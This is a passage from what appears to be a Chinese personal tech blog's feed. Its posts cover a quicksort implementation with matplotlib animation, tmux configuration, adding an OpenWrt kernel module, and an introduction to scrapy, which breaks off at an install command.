        <content type="html"><![CDATA[<p>最近装了个<code>Anaconda</code>，准备学习一下数据可视化。本着三天打鱼两天装死的心态，重新抱起崭新的<strong>算法</strong>书，认真学起了快排算法。学完后用<code>Python</code>实现了一遍基本的快排，然后使用<code>matplotlib</code>进行动态绘图，最后使用<code>imageio</code>生成GIF图片。谨以此文以记之！</p><h2 id="快排基本原理"><a href="#快排基本原理" class="headerlink" title="快排基本原理"></a>快排基本原理</h2><p><strong>快排</strong>采用和归并排序相同的分而治之的思想，将待排序数组分成左右两个子数组，对两部分子数组独立排序。当子数组均有序时，整个数组也就有序了。</p><p>排序步骤如下：</p><ol><li>将原始数组<code>data</code>随机打乱，以消除对输入的依赖（本步可选）</li><li>选择数组的首个元素<code>data[0]</code>作为切分元素<code>v</code></li><li>切分数组<ul><li>从左往右找到第一个大于切分元素<code>v</code>的元素<code>data[i]</code></li><li>从右到左找到第一个小于切分元素<code>v</code>的元素<code>data[j]</code></li><li>交换<code>data[i]</code>与<code>data[j]</code></li><li>重复以上三步直到<code>i&gt;=j</code></li><li>交换<code>data[j]</code>与切分元素<code>data[0]</code></li></ul></li><li>递归调用，对切分后的左侧子数组进行排序</li><li>递归调用，对切分后的右侧子数组进行排序</li></ol><p>文字性的描述总是那么苍白无力，但还好也能说明一些问题。可以看出，快排的关键在于<strong>切分</strong>，切分后的数组应该满足：</p><ol><li>切分元素的位置（设为<code>j</code>）已经固定</li><li><code>data[lo]</code>到<code>data[j-1]</code>区间内的元素均不大于切分元素<code>data[j]</code></li><li><code>data[j+1]</code>到<code>data[hi]</code>区间内的元素均不小于切分元素<code>data[j]</code></li></ol><p>其中<code>data[lo]</code>代表数组或子数组的首个元素，<code>data[hi]</code>代表数组或子数组的末尾元素。</p><p>简单点说，就是先找一个参考点，把小于这个参考点的元素都扔到它的左边，大于这个参考点的数都扔到它的右边。这样一来，参考点的位置就固定了，然后对左边的数据和右边的数据各自再递归的扔几遍，等所有子数组都扔完了，整个数组也就有序了。</p><p>不过需要注意的是，扔的时候不是随便扔，是把从左往右找到的第一个大于参考点的值和从右往左找到的第一个小于参考点的值进行替换。</p><h2 id="基本实现"><a href="#基本实现" class="headerlink" title="基本实现"></a>基本实现</h2><blockquote><p>Talk is cheap, show me the code</p></blockquote><pre><code class="python">def sort(data):    __sort(data, 0, len(data) - 1)def __sort(data, lo, hi):    if lo &gt;= hi:        return    key = __partition(data, lo, hi)    __sort(data, lo, key - 1)    __sort(data, key + 1, hi)def __swap(data, lo, hi):    data[lo], data[hi] = data[hi], data[lo]def __partition(data, lo, hi):    &#39;&#39;&#39;partition array&#39;&#39;&#39;    i = lo    j = hi    v = data[lo] # slicing element    while True:        # find one element that larger than v scan from left to right(→)        i += 1        while data[i] &lt; v:            if i == hi:                break            i += 1        # find one element that smaller than v scan from right to left(←)        while v &lt; data[j]:            if j == lo:                break            j -= 1        if i &gt;= j:            break        __swap(data, i, j)    __swap(data, lo, j)    return j</code></pre><p>以上便是参考<code>Algorithms</code>书上<code>java</code>代码的<code>Python</code>实现。下面是个使用示例：</p><pre><code class="python">import randomdef main():    data = [_ for _ in range(20)]    random.shuffle(data)    print(data)    sort(data)    print(data)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>执行结果如下：</p><pre><code class="bash">$ python quick.py[4, 9, 1, 13, 18, 5, 6, 14, 2, 16, 7, 12, 15, 8, 11, 17, 0, 19, 10, 3][0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]</code></pre><h2 id="快排优化"><a href="#快排优化" class="headerlink" title="快排优化"></a>快排优化</h2><p>快排有很多优化算法，目前我只习得一种最简单的，可以将切分函数两个内部<code>while</code>循环中的<code>if</code>语句去掉</p><pre><code class="python"># first oneif i == hi:    break# second oneif j == lo:    break</code></pre><p>这两个判断都是为了防止访问数组越界而设，其实第二个是完全没有必要加的，因为<code>lo</code>对应的就是切分元素本身，自己肯定不会小于自己，所以这个判断完全是多余的；对于第一个，想要去掉的话，只要保证数组最后一个元素最大即可，实现上只要在执行排序函数之前将最大值换至最后即可。</p><pre><code class="py">__swap(data, data.index(max(data)), len(data) - 1)</code></pre><p>本文后续的<code>code</code>会将第二个判断去掉，但第一个的还保留着，毕竟把最大值直接挪到最后总感觉怪怪的，在可视化的时候也会牺牲一点随机性。</p><h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><p>为了方便代码的阅读和管理,我将快排代码封装成<code>QuickSort</code>类,同时加入变量<code>swap_times</code>用于记录总的数据交换次数。</p><pre><code class="py">class QuickSort(object):    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;    def sort(self, data):        self.swap_times = 0        # set the largest element to the end        # self.__swap(data, data.index(max(data)), len(data) - 1)        self.__sort(data, 0, len(data) - 1)        return self.swap_times    def __swap(self, data, lo, hi):        data[lo], data[hi] = data[hi], data[lo]        self.swap_times += 1    def __sort(self, data, lo, hi):        if lo &gt;= hi:            return        key = self.__partition(data, lo, hi)        self.__sort(data, lo, key - 1)        self.__sort(data, key + 1, hi)    def __partition(self, data, lo, hi):        &#39;&#39;&#39;partition array&#39;&#39;&#39;        i = lo        j = hi        v = data[lo] # slicing element        while True:            # find one element that larger than v scan from left to right(→)            i += 1            while data[i] &lt; v:                # below judge can dropped if the end element is the largest                if i == hi:                    break                i += 1            # find one element that smaller than v scan from right to left(←)            while v &lt; data[j]:                j -= 1            if i &gt;= j:                break            self.__swap(data, i, j)        self.__swap(data, lo, j)        return j</code></pre><h2 id="打印数据交换记录"><a href="#打印数据交换记录" class="headerlink" title="打印数据交换记录"></a>打印数据交换记录</h2><p>为了了解排序过程中数据交换,可以在<code>__swap</code>函数中打印每一次交换后的数组。</p><pre><code class="py">def __init__(self, debug=False, save_fig=False):    self.debug = debugdef __swap(self, data, lo, hi):    data[lo], data[hi] = data[hi], data[lo]    self.swap_times += 1    if self.debug:        print(&#39;&#123;0&#125; swap(&#123;1&#125;, &#123;2&#125;)&#39;.format(data, lo, hi))</code></pre><p>示例：</p><pre><code class="py">#main.pydef main():    data = []    random.seed(time.time())    data = [_ for _ in range(20)]    random.shuffle(data)    qs = QuickSort(debug=True)    swap_times, = qs.sort(data)if __name__ == &#39;__main__&#39;:    main()</code></pre><pre><code class="sh">➜  algorithm git:(master) ✗ ./main.py[14, 3, 11, 10, 4, 1, 2, 12, 18, 17, 7, 8, 13, 15, 0, 9, 16, 6, 5, 19] swap(4, 19)[14, 3, 11, 10, 4, 1, 2, 12, 5, 17, 7, 8, 13, 15, 0, 9, 16, 6, 18, 19] swap(8, 18)[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 15, 0, 9, 16, 17, 18, 19] swap(9, 17)[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 0, 15, 16, 17, 18, 19] swap(13, 15)[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 14)[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 0)[0, 3, 2, 10, 4, 1, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(2, 6)[0, 3, 2, 1, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(3, 5)[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 3)[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 1)[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(4, 4)[0, 1, 2, 3, 4, 10, 9, 12, 5, 6, 7, 8, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 13)[0, 1, 2, 3, 4, 10, 9, 8, 5, 6, 7, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 11)[0, 1, 2, 3, 4, 7, 9, 8, 5, 6, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 10)[0, 1, 2, 3, 4, 7, 6, 8, 5, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 9)[0, 1, 2, 3, 4, 7, 6, 5, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 8)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 7)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 5)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(8, 8)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19] swap(12, 13)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(11, 12)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(15, 15)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(16, 16)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(17, 17)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(18, 18)</code></pre><p>根据打印结果可以逐步分析快排算法的执行过程，明确知晓每一次交换的数据。</p><h2 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h2><p>打印log固然可以分析算法的执行流程，但是不够直观，所以想着用可视化工具进一步处理，以动态图片形式显示快排过程。为此，只需在交换数据的函数<code>__swap</code>中使用<code>matplotlib</code>的柱状图绘制交换完成后的数组即可。</p><pre><code class="python">import matplotlib.pyplot as plt...class QuickSort(object):    def __init__(self, debug=False, save_fig=False):        ...        self.save_fig = save_fig        self.fig, self.ax = plt.subplots()        # open interactive mode of matplot        plt.ion()        if self.save_fig:            self.path = &#39;./images/&#123;0&#125;&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))            os.makedirs(self.path)    def __swap(self, data, lo, hi):        ...        self.__plot_figure(data, lo, hi, show_swap=True)    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;        self.ax.clear()        self.ax.set_title(&#39;data quicksort&#39;)        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)        if show_swap:            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)        plt.legend()        plt.pause(0.001)        if self.save_fig:            plt.savefig(&#39;&#123;0&#125;/&#123;1&#125;.png&#39;.format(self.path, self.swap_times))</code></pre><p>需要注意的几点是：</p><ol><li><code>matplotlib</code>具有两种绘图模式，阻塞(<code>block</code>)模式和交互(<code>interactive</code>)模式，阻塞模式必须等待当前绘图窗口关闭方才执行后续程序，而交互模式则无需等待。为了动态显示排序过程，自然选择交互模式，所以初始化时调用<code>ion()</code>函数打开交互模式</li><li>相比于其它样式的图表，使用柱状图<code>bar</code>能够更直观显示数据大小及变化过程</li><li>在每次重绘图表时，需要清空原有图表</li><li>必须调用<code>pause</code>函数予以等待，否则可能出现无法显示图表的情况，等待时长自定</li><li>为了突出显示每次交换的两个数据，可以使用红色图表单独绘制交换数据</li><li>使用<code>matplotlib</code>函数库中的<code>savefig</code>可以将图表为至本地图片文件，为后续生成<code>gif</code>图片做准备</li></ol><p><img src="/assets/algorithm/dataBar.png" alt="data bar"></p><h2 id="生成GIF动图"><a href="#生成GIF动图" class="headerlink" title="生成GIF动图"></a>生成GIF动图</h2><p>有了前面保存好的图片，使用<code>imageio</code>库的<code>append</code>函数及<code>mimsave</code>即可生成<code>gif</code>图片。图片间隔时间由<code>mimsave</code>函数的<code>duration</code>参数决定。</p><pre><code class="python"># main.pyimport imageiofrom quick_sort import QuickSortimport osfrom os.path import joindef save_gif(path, gif_name):    if not os.path.exists(path) or len(os.listdir(path))==0:        return    images = []    for file_name in range(len(os.listdir(path))):        file_path = join(path, &#39;&#123;&#125;.png&#39;.format(file_name))        images.append(imageio.imread(file_path))    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)</code></pre><p><img src="/assets/algorithm/quickSort.gif" alt="quick sort"></p><p>至此，便完成了快排的算法实现及其可视化。</p><h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><p>代码已上传至<a href="https://github.com/Litreily/Python-demos.git">github Python-demos</a> <code>algorithm</code>目录</p><ul><li>quick_sort.py</li></ul><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-import matplotlib.pyplot as pltimport timeimport osclass QuickSort(object):    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;    def __init__(self, debug=False, save_fig=False):        self.debug = debug        self.save_fig = save_fig        self.fig, self.ax = plt.subplots()        plt.ion()        if self.save_fig:            self.path = &#39;./images/&#123;0&#125;&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))            os.makedirs(self.path)    def sort(self, data):        self.swap_times = 0        self.__plot_figure(data)        # set the largest element to the end        # self.__swap(data, data.index(max(data)), len(data) - 1)        self.__sort(data, 0, len(data) - 1)        return self.swap_times, self.path    def __swap(self, data, lo, hi):        data[lo], data[hi] = data[hi], data[lo]        self.swap_times += 1        if self.debug:            print(&#39;\t&#123;0&#125; swap(&#123;1&#125;, &#123;2&#125;)&#39;.format(data, lo, hi))        self.__plot_figure(data, lo, hi, show_swap=True)    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;        self.ax.clear()        self.ax.set_title(&#39;data quicksort&#39;)        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)        if show_swap:            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)        plt.legend()        plt.pause(0.001)        if self.save_fig:            plt.savefig(&#39;&#123;0&#125;/&#123;1&#125;.png&#39;.format(self.path, self.swap_times))    def __sort(self, data, lo, hi):        if lo &gt;= hi:            return        key = self.__partition(data, lo, hi)        self.__sort(data, lo, key - 1)        self.__sort(data, key + 1, hi)    def __partition(self, data, lo, hi):        &#39;&#39;&#39;partition array&#39;&#39;&#39;        i = lo        j = hi        v = data[lo] # slicing element        while True:            # find one element that larger than v scan from left to right(→)            i += 1            while data[i] &lt; v:                # below judge can dropped if the end element is the largest                if i == hi:                    break                i += 1            # find one element that smaller than v scan from right to left(←)            while v &lt; data[j]:                j -= 1            if i &gt;= j:                break            self.__swap(data, i, j)        self.__swap(data, lo, j)        return j</code></pre><ul><li>main.py</li></ul><pre><code class="python">#!/bin/env python# -*- encoding: utf-8 -*-import timeimport randomimport imageiofrom quick_sort import QuickSortimport osfrom os.path import joindef save_gif(path, gif_name):    if not os.path.exists(path) or len(os.listdir(path))==0:        return    images = []    for file_name in range(len(os.listdir(path))):        file_path = join(path, &#39;&#123;&#125;.png&#39;.format(file_name))        images.append(imageio.imread(file_path))    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)def main():    data = []    random.seed(time.time())    random.shuffle(data)    print(&#39;source: &#123;0&#125;&#39;.format(data))    start = time.time()    qs = QuickSort(debug=False, save_fig=True)    swap_times, fig_path = qs.sort(data)    save_gif(fig_path, &#39;quick_sort.gif&#39;)    stop = time.time()    print(&#39;result: &#123;0&#125;\n&#39;.format(data))    print(&#39;----------------------------------&#39;)    print(&#39;swap times: &#123;0&#125;&#39;.format(swap_times))    print(&#39;spend time: &#123;0&#125;s&#39;.format(stop - start))    print(&#39;image path: &#123;0&#125;&#39;.format(fig_path))    print(&#39;----------------------------------&#39;)if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sort </tag>
            
            <tag> visualization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux常用配置说明</title>
      <link href="2018/06/19/tmux-config/"/>
      <url>2018/06/19/tmux-config/</url>
      
        <content type="html"><![CDATA[<p><code>tmux</code>作为<code>Linux</code>三大神器之一，结合<code>zsh</code>和<code>vim</code>堪称无敌，<code>tmux</code>作为分屏利器自有其强大之处，本文就其常用配置予以说明。</p><h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><pre><code class="zsh"># install in ubuntu$ sudo apt-get install tmux</code></pre><ul><li><code>Ctrl+B</code>: default keys of tmux <code>prefix</code></li><li><code>.tmux.conf</code>: config file of <code>tmux</code></li><li><code>tmux source-file .tmux.conf</code>: command to reload <code>.tmux.conf</code></li></ul><span id="more"></span><h2 id="禁止自动更新窗口名称"><a href="#禁止自动更新窗口名称" class="headerlink" title="禁止自动更新窗口名称"></a>禁止自动更新窗口名称</h2><p>默认情况下，<code>tmux</code>会根据当前目录及相关操作自动更改窗口名称，但通常情况下，我们是不需要其修改的，为此可以在配置文件中添加：</p><pre><code class="yml">setw -g allow_rename &#39;off&#39;</code></pre><h2 id="设置zsh作为默认shell"><a href="#设置zsh作为默认shell" class="headerlink" title="设置zsh作为默认shell"></a>设置zsh作为默认shell</h2><p>如果先安装的<code>tmux</code>, 后安装和配置<code>zsh</code>，那tmux有可能默认打开使用的是<code>bash</code>，此时可以使用以下配置指令予以更改：</p><pre><code class="yml">set-option -g default-shell /bin/zsh</code></pre><h2 id="设置vim作为默认编辑器"><a href="#设置vim作为默认编辑器" class="headerlink" title="设置vim作为默认编辑器"></a>设置vim作为默认编辑器</h2><p>在<code>tmux</code>的搜索模式<code>prefix+[</code>下，默认使用↑↓←→箭头作为移动按键，对于习惯于<code>vim</code>操作的我来讲，这显然很不方便，还好<code>tmux</code>提供了使用<code>vim</code>作为编辑器的选项，启用配置如下：</p><pre><code class="yml">setw -g mode-keys vi</code></pre><h2 id="解决配色问题"><a href="#解决配色问题" class="headerlink" title="解决配色问题"></a>解决配色问题</h2><p>在<code>tmux</code>中，有可能部分应用的配色与纯<code>shell</code>下不一致，尤其是<code>vim</code>，后来发现<code>htop</code>也存在这个问题。要解决很简单，在<code>tmux</code>配置中加上一句：</p><pre><code class="yml">set -g default-terminal &quot;screen-256color&quot;</code></pre><h2 id="存储-恢复tmux工作环境"><a href="#存储-恢复tmux工作环境" class="headerlink" title="存储/恢复tmux工作环境"></a>存储/恢复tmux工作环境</h2><p>如果在服务器上使用<code>tmux</code>，由于服务器基本不关机，所以不用考虑<code>tmux</code>环境会丢失。但是在个人电脑上使用的话，重启电脑后<code>tmux</code>环境就丢失了，如果每次重启都要重新配置一遍环境的话，那未免太浪费时间了。所以这里推荐个插件<a href="https://github.com/tmux-plugins/tmux-resurrect">tmux-resurrect</a></p><p><code>tmux-resurrect</code>可以对<code>tmux</code>环境进行保存和恢复，安装及配置如下：</p><pre><code class="zsh">$ mkdir ~/.tmux$ git clone https://github.com/tmux-plugins/tmux-resurrect ~/.tmux/tmux-resurrect# edit .tmux.conf at the bottom$ vi ~/.tmux.confrun-shell ~/.tmux/tmux-resurrect/resurrect.tmux# re source .tmux.conf$ tmux source-file ~/.tmux.conf</code></pre><p><code>tmux-resurrect</code>用法:</p><ul><li><code>prefix + Ctrl-s</code> - save</li><li><code>prefix + Ctrl-r</code> - restore</li></ul><p>插件<code>tmux-resurrect</code>还可以结合插件<code>tmux-continum</code>一起使用，<code>tmux-continum</code>可以自动定时存储环境，在开机后打开<code>tmux</code>时自动恢复环境，这就避免了人为存储和恢复的麻烦以及因忘记存储导致的环境丢失。<code>tmux-continum</code>的安装及配置如下:</p><pre><code class="zsh">$ git clone https://github.com/tmux-plugins/tmux-continuum ~/.tmux/tmux-continum# edit .tmux.conf$ vi ~/.tmux.confset -g @continuum-restore &#39;on&#39;  # restore last saved envset -g @continuum-save-interval &#39;30&#39;  # default is 15 minutesrun-shell ~/.tmux/tmux-continum/continuum.tmux$ tmux source ~/.tmux.conf</code></pre><p><strong>说明</strong>：</p><ol><li>以上两个插件都是手动安装的，其实也可以使用<code>tmux</code>的插件管理器<a href="https://github.com/tmux-plugins/tpm">tpm</a>进行安装，这里就不详述了。</li><li>以上插件要求<code>tmux</code>版本大等于<code>1.9</code></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html">https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html</a></li><li><a href="https://github.com/tmux/tmux">https://github.com/tmux/tmux</a></li><li><a href="https://github.com/tmux-plugins/tpm">https://github.com/tmux-plugins/tpm</a></li><li><a href="https://github.com/tmux-plugins/tmux-resurrect">https://github.com/tmux-plugins/tmux-resurrect</a></li><li><a href="https://github.com/tmux-plugins/tmux-continuum">https://github.com/tmux-plugins/tmux-continuum</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openwrt中添加内核模块</title>
      <link href="2018/05/30/openwrt-ko/"/>
      <url>2018/05/30/openwrt-ko/</url>
      
        <content type="html"><![CDATA[<p>如果想要在<code>Openwrt</code>系统中添加一个内核模块，其实并不难，对着某个已有的内核模块，依葫芦画瓢嘛，不难。本文将介绍一个最最简单的</p><h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><p>path: <code>git_repo/package/kmod-demo/</code></p><p>下面是源码包含的所有文件，根级<code>Makefile</code>提供给内核编译器使用，<code>src</code>级<code>Makefile</code>用于编译<code>.ko</code>文件。</p><pre><code class="txt">$ tree.├── Makefile└── src    ├── demo.c    ├── Kconfig    └── Makefile</code></pre><h3 id="demo-c"><a href="#demo-c" class="headerlink" title="demo.c"></a>demo.c</h3><p>源码非常简单，在装载时打印<code>Hello World</code>，卸载时打印<code>Exit</code>。</p><pre><code class="c">#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;static int __init hello_init(void)&#123;    printk(&quot;Hello World\n&quot;);    return 0;&#125;static void __exit hello_exit(void)&#123;    printk(&quot;Exit\n&quot;);&#125;module_init(hello_init);module_exit(hello_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;Guangtao.wu&quot;);</code></pre><h3 id="Kconfig"><a href="#Kconfig" class="headerlink" title="Kconfig"></a>Kconfig</h3><p>在<code>Kconfig</code>文件中添加一些编译相关的选项</p><pre><code class="json">config DEMO    tristate &quot;This is a Module_DEMO&quot;    default n    help      This is a DEMO, for debugging kernel model.      If unsure, say N.</code></pre><ul><li><code>default</code> : 该选项的默认值<ul><li><code>n</code> 不编译</li><li><code>y</code> 编译到内核，启动时自动加载</li><li><code>m</code> 编译生成<code>.ko</code>模块，不自动加载，需使用<code>insmod</code>加载</li></ul></li></ul><h3 id="Root-Makefile"><a href="#Root-Makefile" class="headerlink" title="Root - Makefile"></a>Root - Makefile</h3><p>根级<code>Makefile</code>仿其它内核模块编写，注意替换名称<code>demo</code>，<code>SUBMENU</code>以及<code>TITLE</code>将显示在<code>make menuconfig</code>的交互界面中。</p><pre><code class="makefile">## Copyright (C) 2006 OpenWrt.org## This is free software, licensed under the GNU General Public License v2.# See /LICENSE for more information.## $Id: Makefile 6565 2007-03-14 13:42:21Z nbd $include $(TOPDIR)/rules.mkinclude $(INCLUDE_DIR)/kernel.mkPKG_NAME:=demoPKG_RELEASE:=1PKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)include $(INCLUDE_DIR)/package.mkdefine KernelPackage/demo  SUBMENU:=Other modules  TITLE:=kernel demo  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)  FILES:= $(PKG_BUILD_DIR)/demo.$(LINUX_KMOD_SUFFIX)  AUTOLOAD:=$(call AutoLoad,46,demo)endefdefine Build/Prepare  mkdir -p $(PKG_BUILD_DIR)  $(CP) ./src/* $(PKG_BUILD_DIR)endefdefine Build/Compile  $(MAKE) -C &quot;$(LINUX_DIR)&quot; \    CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \    ARCH=&quot;$(LINUX_KARCH)&quot; \    SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \    EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \    modulesendefdefine KernelPackage/demo/install  $(INSTALL_DIR) $(1)/lib/network/endef$(eval $(call KernelPackage,demo))</code></pre><h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src - Makefile"></a>src - Makefile</h3><p>源码的<code>Makefile</code>很简单，其实只要一行就够了，其中<code>CONFIG_&lt;module_name&gt;</code>需要在后续<code>.config</code>文件中配置，或者直接将<code>$(CONFIG_DEMO)</code>改为<code>y</code>或<code>m</code>即可。</p><pre><code class="Makefile">obj ?= .obj-$(CONFIG_DEMO) += demo.o</code></pre><h2 id="更新-config"><a href="#更新-config" class="headerlink" title="更新 .config"></a>更新 .config</h2><p>使用<code>make menuconfig</code>或者直接修改配置文件<code>.config</code>可以启用新添加的内核模块。</p><ol><li><code>make menuconfig</code>: 搜索<code>demo</code>将其选中然后保存退出</li><li>手动启用，修改<code>.config</code>，在<code>Others module</code>配置参数附近添加如下内容</li></ol><pre><code class="c">CONFIG_KERNEL_kmod_demo=y</code></pre><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>当源码和配置选项都准备好后，便可以编译安装了，单独安装需要整个<code>kernel</code>已经编译过一次，以保证交叉编译工具链能够正常使用。</p><pre><code class="sh">make package/kmod-demo/compile V=smake package/kmod-demo/install V=s</code></pre><h2 id="insmod-rmmod"><a href="#insmod-rmmod" class="headerlink" title="insmod/rmmod"></a>insmod/rmmod</h2><pre><code class="sh"># insmod$ insmod demo.koHello World# rmmod$ rmmod demo.koExit</code></pre><p>look, <code>printk</code>的信息已经成功打印出来了！</p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫4 - scrapy入门</title>
      <link href="2018/05/27/scrapy-start/"/>
      <url>2018/05/27/scrapy-start/</url>
      
        <content type="html"><![CDATA[<p><code>scrapy</code>作为一款强大的爬虫框架，当然要好好学习一番，本文便是本人学习和使用<code>scrapy</code>过后的一个总结，内容比较基础，算是入门笔记吧，主要讲述<code>scrapy</code>的基本概念和使用方法。</p><h2 id="scrapy-framework"><a href="#scrapy-framework" class="headerlink" title="scrapy framework"></a>scrapy framework</h2><p>首先附上<code>scrapy</code>经典图如下：</p><p><img src="/assets/spider/scrapy/scrapy.jpg" alt="scrapy framework"></p><p><code>scrapy</code>框架包含以下几个部分</p><ol><li><code>Scrapy Engine</code> 引擎</li><li><code>Spiders</code> 爬虫</li><li><code>Scheduler</code> 调度器</li><li><code>Downloader</code> 下载器</li><li><code>Item Pipeline</code> 项目管道</li><li><code>Downloader Middlewares</code> 下载器中间件</li><li><code>Spider Middlewares</code> 爬虫中间件</li></ol><h3 id="spider-process"><a href="#spider-process" class="headerlink" title="spider process"></a>spider process</h3><p>其爬取过程简述如下：</p><ol><li>引擎从爬虫获取首个待爬取的链接<code>url</code>，并传递给调度器</li><li>调度器将链接存入队列</li><li>引擎向调度器请求要爬取的链接，并将请求得到的链接经下载器中间件传递给下载器</li><li>下载器从网上下载网页，下载后的网页经下载器中间件传递给引擎</li><li>引擎将网页经爬虫中间件传递给爬虫</li><li>爬虫对网页进行解析，将得到的<code>Items</code>和新的链接经爬虫中间件交给引擎</li><li>引擎将从爬虫得到的<code>Items</code>交给项目管道，将新的链接请求<code>requests</code>交给调度器</li><li>此后循环2~7步，直到没有待爬取的链接为止</li></ol><p>需要说明的是，项目管道(<code>Item Pipeline</code>)主要完成数据清洗，验证，持久化存储等工作；下载器中间件(<code>Downloader Middlewares</code>)作为下载器和引擎之间的的钩子(<code>hook</code>)，用于监听或修改下载请求或已下载的网页，比如修改请求包的头部信息等；爬虫中间件(<code>Spider Middlewares</code>)作为爬虫和引擎之间的钩子(<code>hook</code>)，用于处理爬虫的输入输出，即网页<code>response</code>和爬虫解析网页后得到的<code>Items</code>和<code>requests</code>。</p><h3 id="Items"><a href="#Items" class="headerlink" title="Items"></a>Items</h3><p>至于什么是<code>Items</code>，个人认为就是经爬虫解析后得到的一个数据单元，包含一组数据，比如爬取的是某网站的商品信息，那么每爬取一个网页可能会得到多组商品信息，每组信息包含商品名称，价格，生产日期，商品样式等，那我们便可以定义一组<code>Item</code></p><pre><code class="python">from scrapy.item import Itemfrom scrapy.item import Fieldclass GoodsItem(Item):    name = Field()    price = Field()    date = Field()    types = Field()</code></pre><p><code>Field()</code>实质就是一个字典<code>Dict()</code>类型的扩展，如上代码所示，一组<code>Item</code>对应一个商品信息，单个网页可能包含一个或多个商品，所有<code>Item</code>信息都需要在<code>Spider</code>中赋值，然后经引擎交给<code>Item Pipeline</code>。具体实现在后续博文的实例中会有体现，本文旨在简单记述<code>scrapy</code>的基本概念和使用方法。</p><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>with <code>pip</code></p><pre><code class="node">pip install 